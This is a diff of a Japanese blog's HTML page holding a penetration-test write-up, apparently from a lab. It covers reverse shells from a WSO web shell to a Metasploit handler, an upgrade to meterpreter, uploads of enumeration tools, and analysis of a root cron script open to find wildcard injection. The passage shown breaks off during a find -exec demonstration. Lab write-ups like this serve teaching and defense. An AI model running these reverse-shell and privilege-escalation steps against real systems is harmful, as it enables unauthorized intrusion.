@@ -2,7 +2,7 @@
 <html lang="ja-JP"><head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<meta name="generator" content="Hugo 0.94.0-DEV" />
+	<meta name="generator" content="Hugo 0.68.3" />
 	
 	<link rel="icon" href="/img/favicon.ico">
 	
@@ -57,9 +57,9 @@
     "name" : ""
   },
   "headline": "ペネトレ検証-権限昇格とWildcard Injectionの原理",
-  "description" : "しゅーとです。 引き続きペネトレーションテストの検証をしていきます。 前回の記事はこちら。 ペネトレ検証-ECサイトに侵入 前回はECShopの脆弱",
+  "description" : "しゅーとです。\n引き続きペネトレーションテストの検証をしていきます。\n前回の記事はこちら。\nペネトレ検証-ECサイトに侵入\n",
   "inLanguage" : "en",
-  "wordCount":  8289 ,
+  "wordCount":  7944 ,
   "datePublished" : "2019-05-13T03:15:21",
   "dateModified" : "2019-05-13T03:15:21",
   "image" : "https:\/\/www.shutingrz.com\/img\/favicon.ico",
@@ -79,43 +79,38 @@
 </script>
 
 <meta property="og:title" content="ペネトレ検証-権限昇格とWildcard Injectionの原理" />
-<meta property="og:description" content="しゅーとです。 引き続きペネトレーションテストの検証をしていきます。 前回の記事はこちら。 ペネトレ検証-ECサイトに侵入 前回はECShopの脆弱">
+<meta property="og:description" content="しゅーとです。
+引き続きペネトレーションテストの検証をしていきます。
+前回の記事はこちら。
 
-
-
-
-<meta property="og:image" content="https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/cover.png" />
-
+ペネトレ検証-ECサイトに侵入">
+<meta property="og:image" content="https://www.shutingrz.com/img/favicon.ico" />
 <meta property="og:url" content="https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/" />
 <meta property="og:type" content="website" />
 <meta property="og:site_name" content="Shooting!!!" />
   <meta name="twitter:title" content="ペネトレ検証-権限昇格とWildcard Injectionの原理" />
-  <meta name="twitter:description" content="しゅーとです。 引き続きペネトレーションテストの検証をしていきます。 前回の記事はこちら。 ペネトレ検証-ECサイトに侵入 前回はECShopの脆弱">
+  <meta name="twitter:description" content="しゅーとです。
+引き続きペネトレーションテストの検証をしていきます。
+前回の記事はこちら。
 
-
-
-  <meta name="twitter:image" content="https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/cover.png" />
-
+ペネトレ検証-ECサイトに侵入">
+  <meta name="twitter:image" content="https://www.shutingrz.com/img/favicon.ico" />
   <meta name="twitter:card" content="summary" /> 
+	
 
 	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
-	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp"
+	 crossorigin="anonymous">
 	<link href="https://fonts.googleapis.com/css?family=Righteous%7CMerriweather:300,300i,400,400i,700,700i" rel="stylesheet">
-
-	
-	<link rel="stylesheet" href="https://www.shutingrz.com/css/medium.ece05c3e0cb4c172303048d902f5c72734dac11b313a671c381a53648c811f4d.css" integrity="sha256-7OBcPgy0wXIwMEjZAvXHJzTawRsxOmccOBpTZIyBH00=">
-
-	
-	<link rel="stylesheet" href="https://www.shutingrz.com/css/additional.569f3996ca35a233f4c0bd5be50243eac6dc4238f8a2cc79fc5231c99323b016.css" integrity="sha256-Vp85lso1ojP0wL1b5QJD6sbcQjj4osx5/FIxyZMjsBY=">
+	<link href="/css/medium.css" rel="stylesheet">
+	<link href="/css/additional.css" rel="stylesheet">
 
 	
 	
-	<link rel="stylesheet" href="/css/additional.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/codeblock.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/code-default.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/table.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/custom-font.css" integrity="" crossorigin="anonymous" media="screen">
-	<link rel="stylesheet" href="/css/accordion.css" integrity="" crossorigin="anonymous" media="screen">
 </head>
 <body>
 <nav class="navbar navbar-expand-lg navbar-light bg-white fixed-top mediumnavigation nav-down">
@@ -213,31 +208,44 @@
                                     <i class="far fa-star"></i>
                                     May 13, 2019
                                     <i class="far fa-clock clock"></i>
-                                    17 min read
+                                    16 min read
                                 </span>					
                             </div>
                         </div>			
                         	
                         
-                                                
+                              
                         
                         <h1 class="posttitle">ペネトレ検証-権限昇格とWildcard Injectionの原理</h1> 
+                        
+                        <div class="after-post-tags">
+                            <ul class="tags">
+                            
+                            <li>
+                            <a href="/tags/pentest">pentest</a>
+                            </li>
+                            
+                            <li>
+                            <a href="/tags/priv_escalation">priv_escalation</a>
+                            </li>
+                            
+                            <li>
+                            <a href="/tags/ethical_hacking">ethical_hacking</a>
+                            </li>
+                            
+                            </ul>
+                        </div>
                     </div>
 
-                    
-                    
-                    
-                        <img class="featured-image img-fluid" src="https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/cover.png" alt="thumbnail for this post">
                     
                     
 
                     
                     <div class="article-post">
-                        
                         <p>しゅーとです。</p>
 <p>引き続きペネトレーションテストの検証をしていきます。<br>
 前回の記事はこちら。<br>
-<br/>
+<!-- raw HTML omitted -->
 <a href="/post/ad_hack-ec_exploit/">ペネトレ検証-ECサイトに侵入</a></p>
 <hr>
 <p>前回はECShopの脆弱性を用いてRCE、そしてwww-data権限でのバックドア作成に成功しました。</p>
@@ -255,7 +263,7 @@
 <p>ECShopが稼働しているサーバにncコマンドは入っていませんでしたが、WSOはリバースシェル接続の機能があります。<br>
 そのためWSOのリバースシェル経由で meterpreter に接続します。</p>
 <p>まずはAttackerのmsfで普通の shell/reverse_tcp を待ち受けます。</p>
-<pre tabindex="0"><code>msf5 exploit(multi/handler) &gt; show options
+<pre><code>msf5 exploit(multi/handler) &gt; show options
 (snip)
 Payload options (linux/x64/shell/reverse_tcp):
 
@@ -268,16 +276,18 @@ Payload options (linux/x64/shell/reverse_tcp):
 msf5 exploit(multi/handler) &gt; run
 
 [*] Started reverse TCP handler on 192.168.2.22:12345 
+
 </code></pre><p>WSO の Network toolsで、リバースシェルを張りにいきます。</p>
-<figure><img src="./wso_reverse.png"/>
+<figure>
+    <img src="./wso_reverse.png"/> 
 </figure>
 
-<br/> 
-<pre tabindex="0"><code>[*] Sending stage (38 bytes) to 192.168.2.24
+<!-- raw HTML omitted -->
+<pre><code>[*] Sending stage (38 bytes) to 192.168.2.24
 [*] Command shell session 1 opened (192.168.2.22:12345 -&gt; 192.168.2.24:47686) at 2019-05-12 03:35:59 +0900
 </code></pre><p>きました。</p>
 <p>次はmeterpreterにスイッチします。スイッチには shell_to_meterpreter を使います。</p>
-<pre tabindex="0"><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; show options
+<pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; show options
 
 Module options (post/multi/manage/shell_to_meterpreter):
 
@@ -287,24 +297,25 @@ Module options (post/multi/manage/shell_to_meterpreter):
    LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
    LPORT    4433             yes       Port for payload to connect to.
    SESSION  1                yes       The session to run this module on.
-</code></pre><br/>
+</code></pre><!-- raw HTML omitted -->
 <p>実行します。</p>
-<figure><img src="./switch_meterpreter.png"/>
+<figure>
+    <img src="./switch_meterpreter.png"/> 
 </figure>
 
 <p>無事 meterpreter へスイッチできました。</p>
 <p>セッションを見てみます。</p>
-<figure><img src="./switch_meterpreter_sessions.png"/>
+<figure>
+    <img src="./switch_meterpreter_sessions.png"/> 
 </figure>
 
-<br/>
-id: 2 は WSO からリバースシェル接続したセッションです。  
-id: 3 は id:2のセッションを使って注入・接続したmeterpreterセッションです。
-<br/>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <h4 id="小ネタどのようにmeterpreterにスイッチされる">(小ネタ)どのようにmeterpreterにスイッチされる？</h4>
 <p>msfconsoleではshellからmeterpreterを起動させましたが、実際metasploitはどのようにやっているのでしょう。<br>
 実際にパケットをとってみると以下のようになっていました。</p>
-<figure><img src="./switch_meterpreter_pcap.png"/>
+<figure>
+    <img src="./switch_meterpreter_pcap.png"/> 
 </figure>
 
 <p>ワンライナーでmeterpreterのstagerをvictimに実行させてるんですね。<br>
@@ -323,7 +334,7 @@ stagerはLHOSTに記載のホストに接続し、meterpreter stageを読み込�
 LinEnumは、システムの設定不備によって権限昇格が行える箇所がないかチェックするスクリプトです。<br>
 その他、嬉しい情報も集めてくれます。</p>
 <p>meterpreterでvictimにアップロードし実行。</p>
-<pre tabindex="0"><code>meterpreter &gt; upload LinEnum.sh /tmp/.session
+<pre><code>meterpreter &gt; upload LinEnum.sh /tmp/.session
 [*] uploading  : LinEnum.sh -&gt; /tmp/.session
 [*] uploaded   : LinEnum.sh -&gt; /tmp/.session/LinEnum.sh
 meterpreter &gt; shell
@@ -337,38 +348,40 @@ chmod u+x LinEnum.sh
 ./LinEnum.sh | tee LinEnum_out.txt
 </code></pre><p>結果は非常に長大なため省略します。</p>
 <p>結果をみたところ即脆弱性につながる情報はありませんでしたが、以下のいい情報が得られました。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>105<span class="o">(</span>sshd<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>65534<span class="o">(</span>nogroup<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>65534<span class="o">(</span>nogroup<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ecadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ecadmin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ecadmin<span class="o">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">(</span>snip<span class="o">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Are permissions on /home directories lax:
-</span></span><span class="line"><span class="cl">total 12K
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root    root    4.0K May <span class="m">11</span> 18:58 .
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root    root    4.0K May <span class="m">11</span> 18:50 ..
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> ecadmin ecadmin 4.0K May <span class="m">11</span> 19:40 ecadmin
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">(</span>snip<span class="o">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/etc/cron.daily:
-</span></span><span class="line"><span class="cl">total <span class="m">56</span>
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root root  <span class="m">4096</span> May <span class="m">11</span> 19:37 .
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root root  <span class="m">4096</span> May <span class="m">11</span> 18:58 ..
-</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">102</span> Mar <span class="m">21</span> 19:45 .placeholder
-</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root   <span class="m">625</span> Mar <span class="m">31</span>  <span class="m">2018</span> apache2
-</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">15000</span> Dec <span class="m">11</span>  <span class="m">2016</span> apt
-</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root   <span class="m">695</span> May <span class="m">11</span> 19:39 bakProductImage.sh
-</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">1597</span> May  <span class="m">2</span>  <span class="m">2016</span> dpkg
-</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">4125</span> Feb <span class="m">10</span>  <span class="m">2018</span> exim4-base
-</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root   <span class="m">249</span> May <span class="m">17</span>  <span class="m">2017</span> passwd
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">(</span>snip<span class="o">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">### SERVICES #############################################</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Running processes:
-</span></span><span class="line"><span class="cl">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-</span></span><span class="line"><span class="cl">root      <span class="m">1305</span>  0.0  0.0  <span class="m">55184</span>  <span class="m">2824</span> ?        Ss   18:59   0:00 /usr/sbin/sshd
-</span></span></code></pre></div><p>この結果から、3つのことがわかります。</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">uid</span><span class="o">=</span>105<span class="o">(</span>sshd<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>65534<span class="o">(</span>nogroup<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>65534<span class="o">(</span>nogroup<span class="o">)</span>
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ecadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ecadmin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ecadmin<span class="o">)</span>
+
+<span class="o">(</span>snip<span class="o">)</span>
+
+<span class="o">[</span>-<span class="o">]</span> Are permissions on /home directories lax:
+total 12K
+drwxr-xr-x <span class="m">1</span> root    root    4.0K May <span class="m">11</span> 18:58 .
+drwxr-xr-x <span class="m">1</span> root    root    4.0K May <span class="m">11</span> 18:50 ..
+drwxr-xr-x <span class="m">3</span> ecadmin ecadmin 4.0K May <span class="m">11</span> 19:40 ecadmin
+
+<span class="o">(</span>snip<span class="o">)</span>
+
+/etc/cron.daily:
+total 56
+drwxr-xr-x <span class="m">1</span> root root  <span class="m">4096</span> May <span class="m">11</span> 19:37 .
+drwxr-xr-x <span class="m">1</span> root root  <span class="m">4096</span> May <span class="m">11</span> 18:58 ..
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">102</span> Mar <span class="m">21</span> 19:45 .placeholder
+-rwxr-xr-x <span class="m">1</span> root root   <span class="m">625</span> Mar <span class="m">31</span>  <span class="m">2018</span> apache2
+-rwxr-xr-x <span class="m">1</span> root root <span class="m">15000</span> Dec <span class="m">11</span>  <span class="m">2016</span> apt
+-rwxr-xr-x <span class="m">1</span> root root   <span class="m">695</span> May <span class="m">11</span> 19:39 bakProductImage.sh
+-rwxr-xr-x <span class="m">1</span> root root  <span class="m">1597</span> May  <span class="m">2</span>  <span class="m">2016</span> dpkg
+-rwxr-xr-x <span class="m">1</span> root root  <span class="m">4125</span> Feb <span class="m">10</span>  <span class="m">2018</span> exim4-base
+-rwxr-xr-x <span class="m">1</span> root root   <span class="m">249</span> May <span class="m">17</span>  <span class="m">2017</span> passwd
+
+<span class="o">(</span>snip<span class="o">)</span>
+
+<span class="c1">### SERVICES #############################################</span>
+<span class="o">[</span>-<span class="o">]</span> Running processes:
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root      <span class="m">1305</span>  0.0  0.0  <span class="m">55184</span>  <span class="m">2824</span> ?        Ss   18:59   0:00 /usr/sbin/sshd
+
+
+</code></pre></div><p>この結果から、3つのことがわかります。</p>
 <ul>
 <li>sshが2222/tcpで動いている</li>
 <li>ecadminというユーザが存在する</li>
@@ -379,7 +392,7 @@ chmod u+x LinEnum.sh
 <p>BeRootを使います。<br>
 BeRootはプラットフォームの脆弱性を調査するlinux-exploit-suggesterというスクリプトの機能に加えて、汎用的に発生しがちな脆弱性も調査してくれるスクリプトです。</p>
 <p>meterpreterでvictimにアップロードし実行。</p>
-<pre tabindex="0"><code>
+<pre><code>
 meterpreter &gt; upload beroot_linux.tar /tmp/.session
 [*] uploading  : beroot_linux.tar -&gt; /tmp/.session  
 [*] uploaded   : beroot_linux.tar -&gt; /tmp/.session/beroot_linux.tar
@@ -392,67 +405,70 @@ tar xf beroot_linux.tar
 
 cd beroot_linux
 python beroot.py
+
 </code></pre><p>実行した結果、プラットフォームに関する脆弱性はありませんでした。</p>
 <p>しかし、汎用的な脆弱性を見つけるルーチンで意外なものを見つけました。</p>
-<figure><img src="./beroot_out.png"/>
+<figure>
+    <img src="./beroot_out.png"/> 
 </figure>
 
 <p>サーバ管理者が設置した「bakProductImage.sh」に脆弱性があるかもしれないという示唆です。</p>
-<br/>
+<!-- raw HTML omitted -->
 <h3 id="bakproductimagesh-の調査">bakProductImage.sh の調査</h3>
 <p>さて、LinEnumとBeRootで見つけたbakProductImage.shが何者かを調べます。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">bakDir<span class="o">(){</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">img_dir_path</span><span class="o">=</span><span class="nv">$1</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">dir_name</span><span class="o">=</span><span class="sb">`</span>basename <span class="nv">$img_dir_path</span><span class="sb">`</span>
-</span></span><span class="line"><span class="cl">        tar -C <span class="sb">`</span>dirname <span class="nv">$img_dir_path</span><span class="sb">`</span> -cf <span class="nv">$work_dir</span>/<span class="nv">$dir_name</span>.tar <span class="nv">$dir_name</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">ecshop_dir</span><span class="o">=</span>/var/www/html
-</span></span><span class="line"><span class="cl"><span class="nv">bak_dir</span><span class="o">=</span>/var/backups/ecshop
-</span></span><span class="line"><span class="cl"><span class="nv">date</span><span class="o">=</span><span class="sb">`</span>date +<span class="s2">&#34;%Y%m%d&#34;</span><span class="sb">`</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">TMP</span><span class="o">=</span><span class="sb">`</span>mktemp -d<span class="sb">`</span>
-</span></span><span class="line"><span class="cl"><span class="nb">trap</span> <span class="s2">&#34;rm -rf </span><span class="nv">$TMP</span><span class="s2">&#34;</span> EXIT
-</span></span><span class="line"><span class="cl"><span class="nv">work_dir</span><span class="o">=</span><span class="nv">$TMP</span>/<span class="nv">$date</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">mkdir <span class="nv">$work_dir</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">#archive product image dir</span>
-</span></span><span class="line"><span class="cl"><span class="nv">image_dirs</span><span class="o">=</span><span class="sb">`</span> find <span class="nv">$ecshop_dir</span>/images -maxdepth <span class="m">1</span> -name <span class="s2">&#34;*&#34;</span> -type d <span class="sb">`</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">for</span> dir in <span class="nv">$image_dirs</span><span class="p">;</span> <span class="k">do</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">isProductDir</span><span class="o">=</span><span class="sb">`</span>find <span class="nv">$dir</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d  <span class="p">|</span>wc -l<span class="sb">`</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[</span> <span class="nv">$isProductDir</span> -eq <span class="m">1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
-</span></span><span class="line"><span class="cl">                bakDir <span class="nv">$dir</span>
-</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
-</span></span><span class="line"><span class="cl"><span class="k">done</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">#backup</span>
-</span></span><span class="line"><span class="cl">tar -C <span class="sb">`</span>dirname <span class="nv">$work_dir</span><span class="sb">`</span> -cf <span class="nv">$bak_dir</span>/<span class="nv">$date</span>.tar <span class="sb">`</span>basename <span class="nv">$work_dir</span><span class="sb">`</span>
-</span></span><span class="line"><span class="cl">chown ecadmin <span class="nv">$bak_dir</span>/<span class="nv">$date</span>.tar
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">rm -rf <span class="nv">$TMP</span>
-</span></span></code></pre></div><p>ECShopのサイトにある商品画像をバックアップするスクリプトのようです。<br>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>
+
+bakDir<span class="o">(){</span>
+        <span class="nv">img_dir_path</span><span class="o">=</span><span class="nv">$1</span>
+        <span class="nv">dir_name</span><span class="o">=</span><span class="sb">`</span>basename <span class="nv">$img_dir_path</span><span class="sb">`</span>
+        tar -C <span class="sb">`</span>dirname <span class="nv">$img_dir_path</span><span class="sb">`</span> -cf <span class="nv">$work_dir</span>/<span class="nv">$dir_name</span>.tar <span class="nv">$dir_name</span>
+<span class="o">}</span>
+
+
+<span class="nv">ecshop_dir</span><span class="o">=</span>/var/www/html
+<span class="nv">bak_dir</span><span class="o">=</span>/var/backups/ecshop
+<span class="nv">date</span><span class="o">=</span><span class="sb">`</span>date +<span class="s2">&#34;%Y%m%d&#34;</span><span class="sb">`</span>
+
+<span class="nv">TMP</span><span class="o">=</span><span class="sb">`</span>mktemp -d<span class="sb">`</span>
+<span class="nb">trap</span> <span class="s2">&#34;rm -rf </span><span class="nv">$TMP</span><span class="s2">&#34;</span> EXIT
+<span class="nv">work_dir</span><span class="o">=</span><span class="nv">$TMP</span>/<span class="nv">$date</span>
+
+mkdir <span class="nv">$work_dir</span>
+
+<span class="c1">#archive product image dir</span>
+<span class="nv">image_dirs</span><span class="o">=</span><span class="sb">`</span> find <span class="nv">$ecshop_dir</span>/images -maxdepth <span class="m">1</span> -name <span class="s2">&#34;*&#34;</span> -type d <span class="sb">`</span>
+
+<span class="k">for</span> dir in <span class="nv">$image_dirs</span><span class="p">;</span> <span class="k">do</span>
+        <span class="nv">isProductDir</span><span class="o">=</span><span class="sb">`</span>find <span class="nv">$dir</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d  <span class="p">|</span>wc -l<span class="sb">`</span>
+        <span class="k">if</span> <span class="o">[</span> <span class="nv">$isProductDir</span> -eq <span class="m">1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+                bakDir <span class="nv">$dir</span>
+        <span class="k">fi</span>
+<span class="k">done</span>
+
+<span class="c1">#backup</span>
+tar -C <span class="sb">`</span>dirname <span class="nv">$work_dir</span><span class="sb">`</span> -cf <span class="nv">$bak_dir</span>/<span class="nv">$date</span>.tar <span class="sb">`</span>basename <span class="nv">$work_dir</span><span class="sb">`</span>
+chown ecadmin <span class="nv">$bak_dir</span>/<span class="nv">$date</span>.tar
+
+rm -rf <span class="nv">$TMP</span>
+
+</code></pre></div><p>ECShopのサイトにある商品画像をバックアップするスクリプトのようです。<br>
 パッと見は普通のスクリプトですね。</p>
 <p>findコマンドで「/var/www/html/images/」直下のディレクトリを取得し、<br>
 そのディレクトリの直下に&quot;goods_img&quot;ディレクトリが存在するかを確認します。<br>
 goods_imgディレクトリが存在したらそのディレクトリはバックアップ対象になるようですね。</p>
 <p>保存先は /var/backups/ecshop で、%Y%m%d.tar の形式でアーカイブされるようです。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ls -la /var/backups/ecshop/<span class="p">|</span>tail -n <span class="m">3</span>
-</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> ecadmin root <span class="m">4700160</span> May  <span class="m">9</span> 01:00 20190509.tar
-</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> ecadmin root <span class="m">4700160</span> May <span class="m">10</span> 01:00 20190510.tar
-</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> ecadmin root <span class="m">4700160</span> May <span class="m">11</span> 01:00 20190511.tar
-</span></span></code></pre></div><p>日時を見るに、毎日1時にcronが走っているんですね。</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ls -la /var/backups/ecshop/<span class="p">|</span>tail -n 3
+-rw-r--r-- <span class="m">1</span> ecadmin root <span class="m">4700160</span> May  <span class="m">9</span> 01:00 20190509.tar
+-rw-r--r-- <span class="m">1</span> ecadmin root <span class="m">4700160</span> May <span class="m">10</span> 01:00 20190510.tar
+-rw-r--r-- <span class="m">1</span> ecadmin root <span class="m">4700160</span> May <span class="m">11</span> 01:00 20190511.tar
+</code></pre></div><p>日時を見るに、毎日1時にcronが走っているんですね。</p>
 <p>また、以下からcronはroot権限で行われていることが推測できます。</p>
 <ul>
 <li>スクリプト内の最後でchownで所有者をecadminに変更している</li>
 <li>バックアップ先のファイルの所有グループがrootのまま</li>
 </ul>
-<br/>
+<!-- raw HTML omitted -->
 <h3 id="ここまででわかっていること">ここまででわかっていること</h3>
 <p>今までの情報が多かったので、一旦まとめます。</p>
 <ul>
@@ -461,19 +477,20 @@ goods_imgディレクトリが存在したらそのディレクトリはバッ�
 <li>BeRootの結果から、cron.dialy/bakProductImage.sh には find 周りに脆弱性がありそう</li>
 <li>バックアップファイルの所有者・所有グループから、cronはroot権限で実行されてそう</li>
 </ul>
-<br/>
+<!-- raw HTML omitted -->
 <h1 id="wildcard-injectionの原理と検証">Wildcard Injectionの原理と検証</h1>
 <p>BeRootは bakProductImage.shのfindコマンドに脆弱性の可能性ありと指摘しました。</p>
 <p>bakProductImage.sh のfind周りを見てみます。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">image_dirs</span><span class="o">=</span><span class="sb">`</span> find <span class="nv">$ecshop_dir</span>/images -maxdepth <span class="m">1</span> -name <span class="s2">&#34;*&#34;</span> -type d <span class="sb">`</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">for</span> dir in <span class="nv">$image_dirs</span><span class="p">;</span> <span class="k">do</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">isProductDir</span><span class="o">=</span><span class="sb">`</span>find <span class="nv">$dir</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d  <span class="p">|</span>wc -l<span class="sb">`</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[</span> <span class="nv">$isProductDir</span> -eq <span class="m">1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
-</span></span><span class="line"><span class="cl">                bakDir <span class="nv">$dir</span>
-</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
-</span></span><span class="line"><span class="cl"><span class="k">done</span>
-</span></span></code></pre></div><figure><img src="./bak_find.png"/>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">image_dirs</span><span class="o">=</span><span class="sb">`</span> find <span class="nv">$ecshop_dir</span>/images -maxdepth <span class="m">1</span> -name <span class="s2">&#34;*&#34;</span> -type d <span class="sb">`</span>
+
+<span class="k">for</span> dir in <span class="nv">$image_dirs</span><span class="p">;</span> <span class="k">do</span>
+        <span class="nv">isProductDir</span><span class="o">=</span><span class="sb">`</span>find <span class="nv">$dir</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d  <span class="p">|</span>wc -l<span class="sb">`</span>
+        <span class="k">if</span> <span class="o">[</span> <span class="nv">$isProductDir</span> -eq <span class="m">1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+                bakDir <span class="nv">$dir</span>
+        <span class="k">fi</span>
+<span class="k">done</span>
+</code></pre></div><figure>
+    <img src="./bak_find.png"/> 
 </figure>
 
 <p>本スクリプトでは find が2箇所登場しています。</p>
@@ -487,121 +504,118 @@ goods_imgディレクトリが存在したらそのディレクトリはバッ�
 <p>この仕様を利用した攻撃を <strong>Wildcard Injection</strong> といいます。</p>
 <p>しかも今回、/var/www/html/images は公開ディレクトリでした。<br>
 このディレクトリはwww-dataユーザに書き込み権限があるので、自由にディレクトリを作成することができます。(ここが一番キモ)</p>
-<br/>
+<!-- raw HTML omitted -->
 <h2 id="find-コマンドの-おさらい">find コマンドの おさらい</h2>
 <p>攻撃の前に、find コマンドのおさらいをします。<br>
-<br/>
+<!-- raw HTML omitted -->
 find コマンドには、-exec という便利なオプションがあります。<br>
 まずは実験のため、自分の環境で/tmp/images/ ディレクトリを作成します。<br>
 そしてその配下に 201903, 201904, 201905 ディレクトリを作成します。<br>
 （面白いのでぜひみんなも試してくれよな）
-<br/></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ mkdir /tmp/images/
-</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> /tmp/images
-</span></span><span class="line"><span class="cl">$ mkdir <span class="m">201903</span> <span class="m">201904</span> <span class="m">201905</span>
